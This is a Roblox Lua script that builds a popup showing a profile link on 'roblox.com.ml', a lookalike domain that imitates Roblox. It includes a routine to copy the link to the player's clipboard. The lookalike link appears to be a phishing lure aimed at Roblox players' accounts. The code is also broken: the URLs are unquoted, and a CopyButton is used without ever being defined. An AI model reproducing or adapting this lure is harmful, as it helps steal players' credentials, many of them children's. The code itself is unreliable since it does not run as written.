local Players = game:GetService("Players")

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UIStroke = Instance.new("UIStroke")
local Padding = Instance.new("UIPadding")
local TextLabel = Instance.new("TextLabel")

local player = Players.LocalPlayer

ScreenGui.Parent = player:WaitForChild("PlayerGui")

Frame.Size = UDim2.new(0, 360, 0, 120)
Frame.Position = UDim2.new(0.5, -180, 0.5, -60)
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Frame.Parent = ScreenGui

UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = Frame

UIStroke.Thickness = 1
UIStroke.Color = Color3.fromRGB(80, 80, 80)
UIStroke.Transparency = 0.3
UIStroke.Parent = Frame

Padding.PaddingTop = UDim.new(0, 12)
Padding.PaddingBottom = UDim.new(0, 12)
Padding.PaddingLeft = UDim.new(0, 12)
Padding.PaddingRight = UDim.new(0, 12)
Padding.Parent = Frame

TextLabel.Size = UDim2.new(1, 0, 1, 0)
TextLabel.BackgroundTransparency = 1
TextLabel.Text = https://www.roblox.com.ml/users/437740423885/profile
TextLabel.TextColor3 = Color3.fromRGB(235, 235, 235)
TextLabel.Font = Enum.Font.GothamMedium
TextLabel.TextSize = 18
TextLabel.TextWrapped = true
TextLabel.Parent = Frame

TextLabel.TextXAlignment = Enum.TextXAlignment.Center
TextLabel.TextYAlignment = Enum.TextYAlignment.Center

Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
UIStroke.Color = Color3.fromRGB(120, 120, 255)

Frame.BackgroundTransparency = 1
TextLabel.TextTransparency = 1

game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.4), {
    BackgroundTransparency = 0
}):Play()

game:GetService("TweenService"):Create(TextLabel, TweenInfo.new(0.4), {
    TextTransparency = 0
}):Play()

local link = https://www.roblox.com.ml/users/437740423885/profile

CopyButton.MouseButton1Click:Connect(function()

    CopyButton.Text = "Copied ✓"

    local temp = Instance.new("TextBox")
    temp.Parent = ScreenGui
    temp.Text = link
    temp.Size = UDim2.new(0, 0, 0, 0)
    temp:CaptureFocus()
    temp:SelectAll()

    task.wait(0.1)
    temp:Destroy()

    -- vrátit zpět text
    task.wait(1.5)
    CopyButton.Text = "Copy link"
end)
